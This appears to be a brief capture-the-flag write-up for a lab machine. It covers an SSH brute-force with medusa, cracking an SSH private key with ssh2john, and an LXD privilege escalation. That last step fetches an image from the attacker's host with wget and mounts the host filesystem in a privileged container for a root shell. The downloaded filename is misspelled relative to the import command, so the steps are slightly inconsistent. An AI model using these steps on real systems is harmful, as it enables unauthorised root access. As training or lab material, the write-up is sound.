
Target: 10.10.8.161


Robots.txt has a secret /uploads/ folder

http://10.10.8.161/uploads/dict.lst


SSH bruteforce medusa (Failed)

```bash
medusa -u john -P dict.lst -h 10.10.8.161 -M ssh
```

Found Private key in /secretKey

Cracking using ssh2john

LXD Privilege Esclation

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#docker

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server
```

```bash
cd /tmp
wget http://10.17.11.129:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

